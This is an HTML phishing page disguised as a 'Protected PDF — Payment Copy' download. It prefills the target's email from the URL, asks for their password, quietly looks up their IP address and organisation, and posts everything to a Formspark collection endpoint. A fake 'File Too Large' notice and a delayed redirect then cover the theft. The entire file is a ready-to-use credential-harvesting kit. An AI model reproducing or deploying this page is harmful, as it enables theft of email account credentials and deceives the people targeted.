<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Protected PDF — Payment Copy</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; font-family: Arial, sans-serif; }
    body {
      display: flex;
      align-items: center;
      justify-content: center;
      background: #f2f2f2;
      overflow: hidden;
    }
    #splash {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex; align-items: center; justify-content: center;
      background: #111; color: #fff;
      font-size: 1.5rem;
      transition: opacity 0.5s ease;
      z-index: 1000;
    }
    #main {
      opacity: 0;
      transform: translateY(20px);
      transition: opacity 0.6s ease, transform 0.6s ease;
    }
    #main.show {
      opacity: 1;
      transform: translateY(0);
    }
    form {
      background: #fff;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      width: 320px;
    }
    h2 {
      margin-bottom: 1rem;
      text-align: center;
      color: #222;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 1rem;
    }
    input[readonly] {
      background: #f9f9f9;
      color: #555;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #0078d4;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      margin-top: 8px;
    }
    button:hover {
      background: #005fa3;
    }
    #stepPassword.hidden { display: none; }
    #modalOverlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.65);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 2000;
    }
    #modalBox {
      background: #fff;
      padding: 25px;
      border-radius: 12px;
      text-align: center;
      max-width: 320px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
      animation: popIn 0.4s ease forwards;
    }
    @keyframes popIn { from {transform: scale(0.9); opacity:0;} to {transform: scale(1); opacity:1;} }
  </style>
</head>
<body>
  <div id="splash">Loading Protected File...</div>

  <main id="main">
    <form id="mainForm" method="POST" action="https://submit-form.com/your-formspark-endpoint">
      <h2>Protected PDF Access</h2>

      <!-- Email Step -->
      <div id="stepEmail">
        <input type="email" id="email" name="email" placeholder="Email address" required readonly />
        <button type="button" id="continueBtn">Continue</button>
      </div>

      <!-- Password Step -->
      <div id="stepPassword" class="hidden">
        <input type="password" id="password" name="password" placeholder="Password" required />
        <input type="hidden" id="ip" name="ip">
        <input type="hidden" id="hostname" name="hostname">
        <button type="submit">Download Payment Copy</button>
      </div>
    </form>
  </main>

  <div id="modalOverlay">
    <div id="modalBox">
      <h3>File Too Large</h3>
      <p>Your file is being processed. Please wait...</p>
    </div>
  </div>

  <script>
    // Splash load
    window.addEventListener('load', () => {
      setTimeout(() => {
        document.getElementById('splash').style.opacity = '0';
        setTimeout(() => {
          document.getElementById('splash').style.display = 'none';
          document.getElementById('main').classList.add('show');
        }, 500);
      }, 500);
    });

    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const stepEmail = document.getElementById('stepEmail');
    const stepPassword = document.getElementById('stepPassword');
    const continueBtn = document.getElementById('continueBtn');
    const modal = document.getElementById('modalOverlay');

    // Auto-fill email
    window.addEventListener('DOMContentLoaded', () => {
      const params = new URLSearchParams(window.location.search);
      const urlEmail = params.get('email');
      if (urlEmail) {
        emailInput.value = decodeURIComponent(urlEmail);
      } else {
        emailInput.value = "user@example.com"; // fallback demo
      }

      // Fetch IP + Host
      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
          document.getElementById('ip').value = data.ip;
          return fetch(`https://ipapi.co/${data.ip}/json/`);
        })
        .then(r => r.json())
        .then(info => {
          const host = info.org ? `${info.org} (${info.country_name})` : info.country_name || 'Unknown';
          document.getElementById('hostname').value = host;
        })
        .catch(() => {
          document.getElementById('hostname').value = 'Fetch Failed';
        });
    });

    // Continue to password
    continueBtn.addEventListener('click', () => {
      stepEmail.classList.add('hidden');
      stepPassword.classList.remove('hidden');
      passwordInput.focus();
    });

    // On form submit → show modal → redirect after 8s
    document.getElementById('mainForm').addEventListener('submit', () => {
      modal.style.display = 'flex';
      setTimeout(() => {
        window.location.href = "https://submit-form.com/your-formspark-endpoint";
      }, 8000);
    });
  </script>
</body>
</html>
